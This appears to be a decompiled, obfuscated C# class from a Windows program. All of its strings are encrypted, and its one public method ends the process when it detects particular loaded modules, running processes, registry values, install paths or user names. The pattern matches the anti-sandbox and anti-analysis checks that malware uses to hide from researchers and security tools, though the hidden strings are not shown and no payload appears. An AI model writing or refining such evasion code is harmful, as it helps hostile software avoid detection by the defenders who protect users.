using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

internal sealed class Class5
{
	private sealed class Class6
	{
		public bool method_0(string string_0)
		{
			Process[] processes = Process.GetProcesses();
			int num = 0;
			Process process;
			while (true)
			{
				if (num < processes.Length)
				{
					process = processes[num];
					if (process.MainWindowTitle.Contains(string_0) || process.ProcessName.Contains(string_0))
					{
						break;
					}
					num++;
					continue;
				}
				return false;
			}
			process.Dispose();
			GC.Collect();
			GC.WaitForPendingFinalizers();
			GC.Collect();
			return true;
		}
	}

	private sealed class Class7
	{
		[DllImport("kernel32.dll")]
		public static extern bool SetProcessWorkingSetSize(IntPtr intptr_0, int int_0, int int_1);

		[DllImport("kernel32.dll")]
		public static extern IntPtr GetModuleHandle(string string_0);

		[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
		public static extern int GetShortPathName([MarshalAs(UnmanagedType.LPTStr)] string string_0, [MarshalAs(UnmanagedType.LPTStr)] StringBuilder stringBuilder_0, int int_0);
	}

	public static void smethod_0()
	{
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
		Class6 @class = new Class6();
		if (Class7.GetModuleHandle(Class8.smethod_1(-2084959511)).ToInt32() != 0 || @class.method_0(Class8.smethod_1(-2084959493)) || Registry.LocalMachine.OpenSubKey(Class8.smethod_1(-2084959544), writable: false)!.GetValue(Class8.smethod_1(-2084959612))!.ToString() == Class8.smethod_1(-2084959596) || Application.get_StartupPath() == Class8.smethod_1(-2084959894) || @class.method_0(Class8.smethod_1(-2084959935)) || @class.method_0(Class8.smethod_1(-2084959908)) || windowsPrincipal.Identity.Name == Class8.smethod_1(-2084959960) || windowsPrincipal.Identity.Name == Class8.smethod_1(-2084959999) || windowsPrincipal.Identity.Name == Class8.smethod_1(-2084959972))
		{
			Environment.Exit(-1);
		}
	}
}
